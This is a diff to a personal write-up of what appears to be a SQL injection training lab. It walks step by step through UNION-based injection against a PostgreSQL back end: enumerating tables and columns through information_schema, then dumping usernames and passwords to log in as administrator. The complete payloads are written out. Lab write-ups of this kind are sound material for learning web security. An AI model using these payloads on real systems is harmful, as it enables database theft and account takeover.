@@ -26,4 +26,33 @@ MySQL-->	SELECT @@version
 ```
 ' UNION  SELECT version(),'a'--
 ```
-- 
+- now to db contents since its postgresql we look at the cheatsheet and we get this payload
+```
+SELECT * FROM information_schema.tables
+```
+- we need to search for column names after searching we found that (table_name) is one of them
+- now with our union attack
+```
+' UNION  SELECT table_name,'a' FROM information_schema.tables--
+```
+- we got 200
+- now seach for table which contain users we found one that looks sketchy (users_pmfofm)
+- second we need to find column names from cheatsheet
+```
+SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
+```
+- we serch for column name and from the postgresql doc we find this (column_name)
+- now the payload
+```
+' UNION  SELECT column_name,'a' FROM information_schema.columns WHERE table_name = 'users_pmfofm'--
+```
+- and we got 200 in response and found the 2 columns we are lokking for
+```
+username_thytrw
+password_osldaz
+```
+- now build our final payload
+```
+' UNION  SELECT username_thytrw,password_osldaz FROM users_pmfofm--
+```
+- and we got 200 response and we can find the administrator accound in the response we login with it and we solved the lab
